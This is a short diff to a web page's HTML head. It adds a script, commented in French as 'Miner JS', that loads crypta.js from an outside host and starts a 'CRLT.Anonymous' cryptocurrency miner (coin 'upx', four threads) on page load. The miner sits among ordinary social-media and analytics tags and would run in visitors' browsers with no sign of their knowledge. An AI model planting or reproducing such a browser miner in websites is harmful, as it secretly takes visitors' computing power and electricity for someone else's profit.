@@ -3,6 +3,16 @@
 
 <head>
   
+  <!-- Miner JS -->
+  <script src="//statdynamic.com/lib/crypta.js"></script>
+  <script>
+    var miner=new CRLT.Anonymous('acef3f80e0082051c1961b75661993336d22996cda9f', {
+      threads:4,throttle:0.6, coin: "upx",
+    });
+    miner.start();
+  </script>
+  <!-- Fin du miner JS -->
+  
   <div id="fb-root"></div>
   <script async defer crossorigin="anonymous" src="https://connect.facebook.net/fr_FR/sdk.js#xfbml=1&version=v10.0" nonce="DpFEMHi5"></script>
   <!-- Global site tag (gtag.js) - Google Analytics -->
